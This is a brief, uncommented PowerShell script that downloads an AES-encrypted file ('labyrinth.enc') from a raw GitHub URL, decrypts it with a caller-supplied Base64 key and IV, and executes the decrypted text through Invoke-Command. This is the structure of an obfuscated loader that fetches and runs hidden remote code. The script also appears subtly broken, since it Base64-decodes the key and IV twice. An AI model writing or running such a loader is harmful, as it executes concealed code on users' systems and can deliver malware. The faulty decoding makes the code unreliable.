param (
    [Parameter(Mandatory=$true)]
    [string]$Key,

    [Parameter(Mandatory=$true)]
    [string]$IV
)
$key_b64   = [System.Convert]::FromBase64String($Key)
$iv_b64    = [System.Convert]::FromBase64String($IV)
$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
$data_b64  = (New-Object Net.WebClient).DownloadString($url)
$keyBytes = [System.Convert]::FromBase64String($key_b64)
$ivBytes  = [System.Convert]::FromBase64String($iv_b64)
$encryptedBytes = [System.Convert]::FromBase64String($data_b64)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV  = $ivBytes
$decryptor = $aes.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
$aes.Dispose()
$decryptor.Dispose()
$scriptBlock = [scriptblock]::Create($decryptedCommand)
Invoke-Command -ScriptBlock $scriptBlock
